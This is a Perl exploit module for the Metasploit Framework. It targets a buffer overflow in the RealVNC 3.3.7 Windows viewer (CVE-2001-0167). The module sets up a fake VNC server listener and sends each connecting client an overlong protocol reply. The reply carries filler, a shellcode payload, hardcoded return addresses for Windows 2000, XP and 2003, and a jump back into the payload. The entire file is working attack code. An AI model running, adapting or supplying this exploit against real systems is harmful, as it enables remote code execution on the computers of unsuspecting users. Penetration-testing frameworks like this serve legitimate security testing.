##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::realvnc_client;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use  POSIX;

my $advanced =
  {
  };

my $info =
  {
	'Name'           => 'RealVNC 3.3.7 Client Buffer Overflow',
	'Version'        => '$Revision: 1.0 $',
	'Authors'        => [ 'y0 [at] w00t-shell.net' ],
	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a buffer overflow in RealVNC 3.3.7 (vncviewer.exe).
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2000', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'VNCPORT'    => [ 1, 'PORT', 'The local VNC listener port', 5900       ],
		'VNCSERVER'  => [ 1, 'HOST', 'The local VNC listener host', "0.0.0.0"  ],
	  },

	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'Payload'      =>
	  {
		'Space'    => 500,
		'BadChars' => "\x00",
		'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",
		'MaxNops'  => 0,
		'Keys'     => [ '-ws2ord', '-bind' ],
	  },

	'Refs'            =>
	  [
		[ 'BID', '2305' ],
		[ 'CVE', '2001-0167' ],
		[ 'URL', 'http://www1.corest.com/common/showdoc.php?idxseccion=10&idx=116' ],
	  ],

	'DefaultTarget'  => -1,

	'Targets'        =>
	  [
		[ 'Windows 2000 SP4 English',  0x7c2ec68b ],
		[ 'Windows XP SP2 English',    0x76b43ae0 ],
		[ 'Windows 2003 SP1 English',  0x76aa679b ],
	  ],

	'Keys'           => [ 'realvnc' ],

	'DisclosureDate' => 'Jan 29 2001',
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('VNCSERVER'),
		LocalPort => $self->GetVar('VNCPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	);
	
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local VNC listener on " . $self->GetVar('VNCPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to " . $self->GetVar('VNCSERVER') . ":" . $self->GetVar('VNCPORT') . " ...");

	while (defined($client = $server->accept()))
	{
		$self->HandleVNCClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleVNCClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $target    = $self->Targets->[$self->GetVar('TARGET')];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $rhost;
	my $rport;

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	my $filler = $self->MakeNops(993 - length($shellcode));

	my $first =
	  "RFB 003.003\n";

	my $second =
	  "\x00\x00\x00\x00\x00\x00\x04\x06". $filler. $shellcode.
	  pack('V', $target->[1]). $self->MakeNops(10). "\xe8".pack('V', -457).
	  Pex::Text::AlphaNumText(200);

	$self->PrintLine("[*] VNC Client connected from $rhost:$rport...");

	$fd->Send($first);

	my $resp = $fd->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] VNC Client response: ' . $resp);

	if($resp !~ /RFB 003\.003/) {
		$self->PrintLine('[*] Not a RealVNC client... ');
		return;
	}

	$self->PrintLine("[*] Sending ". length($second). " bytes of payload...");

	$fd->Send($second);

	$self->Handler($fd);

	$fd->Close();
}

1;

